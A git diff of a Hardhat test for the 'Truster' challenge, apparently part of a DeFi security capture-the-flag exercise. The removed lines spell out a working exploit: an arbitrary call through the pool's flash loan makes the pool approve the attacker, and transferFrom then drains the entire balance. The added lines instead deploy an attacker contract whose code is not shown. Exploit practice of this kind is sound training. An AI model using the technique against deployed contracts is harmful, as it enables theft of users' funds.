@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Truster', function () {
+describe.only('[Challenge] Truster', function () {
     let deployer, attacker;
 
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
@@ -30,23 +30,9 @@ describe('[Challenge] Truster', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE  */
-
-        const interface = this.tokenFactory.interface;
-        const dataPayload = interface.encodeFunctionData("approve", [
-          attacker.address,
-          TOKENS_IN_POOL.toString()
-        ]);
-        await this.pool.connect(attacker).flashLoan(
-          0,
-          attacker.address,
-          this.token.address,
-          dataPayload,
-        )
-        this.token.connect(attacker).transferFrom(
-          this.pool.address,
-          attacker.address,
-          TOKENS_IN_POOL
-        );
+        const AttackerContract = await ethers.getContractFactory('TrusterPoolAttacker', attacker);
+        attackerContract = await AttackerContract.deploy(this.pool.address, this.token.address);
+        await attackerContract.connect(attacker).attack();
     });
 
     after(async function () {
